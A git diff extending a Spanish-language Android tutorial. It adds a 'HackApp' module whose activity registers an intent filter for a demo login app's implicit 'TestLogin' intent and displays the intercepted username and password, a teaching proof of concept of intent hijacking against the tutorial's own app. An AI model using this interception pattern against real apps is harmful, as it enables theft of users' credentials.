@@ -274,8 +274,62 @@ El manifiesto quedaria de la siguiente manera:
     </manifest>
 ```
 ---
-# Listo. Hasta este punto hemos conseguido la comunicacion entre LoginActivity e IntentReceiverActivity
+# Listo. Hasta este punto hemos conseguido la comunicacion entre LoginActivity e IntentReceiverActivity y notaras que al hacer submit al formulario se abrira IntentReceiverActivity y mostrara los campos de nombre de usuario y contraseña
 ---
+Lo siguiente que tendremos que hacer es crear un modulo dentro de la misma aplicacion  el cual contendra otra aplicacion Android misma interceptara la informacion enviada desde LoginActivity a IntentReceiverActivity.
+### Paso 4 - Dar click derecho a nivel proyecto  y seleccionar New => Module => Phone & Tablet Module, le llamaremos HackApp al igual que en los pasos anteriores crearemos una Activity de nombre MainActivity y su fichero xml de nombre activity_main.xml
+
+El codigo de MainActivity quedaria de la siguiente manera:
+```java
+     @Override
+        protected void onCreate(Bundle savedInstanceState) {
+            super.onCreate(savedInstanceState);
+            setContentView(R.layout.activity_main);
+
+            //Obtenemos los datos del intent
+            String message = "Username: " +
+                    this.getIntent().getStringExtra("username") +
+                    "\n Password: " +
+                    this.getIntent().getStringExtra("password");
+            //Mostramos el dialogo
+            final AlertDialog.Builder alertDialog = new AlertDialog.Builder(this);
+            alertDialog.setTitle("Sensitive data was accessed")
+                    .setMessage(message)
+                    .setNegativeButton("OK", new DialogInterface.OnClickListener() {
+                        @Override
+                        public void onClick(DialogInterface dialog, int which) {
+                            dialog.cancel();
+                        }
+                    });
+
+            alertDialog.create().show();
+        }
+```
+y por ultimo registramos el filtro del intent en el manifiesto de HackApp
+```xml
+    <?xml version="1.0" encoding="utf-8"?>
+    <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.example.hackapp">
+
+        <application android:allowBackup="true" android:icon="@mipmap/ic_launcher"
+            android:label="@string/app_name" android:roundIcon="@mipmap/ic_launcher_round"
+            android:supportsRtl="true" android:theme="@style/AppTheme">
+            <activity android:name=".MainActivity">
+                    <!-- Asociamos la accion y categoria en el intent-filter -->
+                    <intent-filter>
+                        <action android:name="TestLogin"/>
+                        <category android:name="android.intent.category.DEFAULT"/>
+                    </intent-filter>
+            </activity>
+        </application>
+
+    </manifest>
+```
+Notaras que al intentar correr el proyecto HackApp no podra iniciar porque no hemos declarado en su manifiesto que actividad sera la principal, por lo que seleccionaremos EditConfigurations seleccionaremos HackApp y en Launch pulsaremos la opcion Nothing.
+Bien ahora viene lo intesante si corremos la aplicacion la aplicacion que contiene nuestro Login y hacemos submit de la informacion podremos observar que nos aparece una pantalla que Android nos proporciona con las opciones de IntentReceiverActivity y MainActivity de HackApp las cuales nos ayudaran a completar la accion que esta definida en el Intent,
+si seleccionamos IntentReceiverActivity el flujo continuara normalmente hacia la Activity legitima de la aplicacion.
+
+Por otro lado en caso de seleccionar MainActivity notaras que esta disponible para leer el nombre de usuario y contraseña en un dialogo.
+
 
 
 
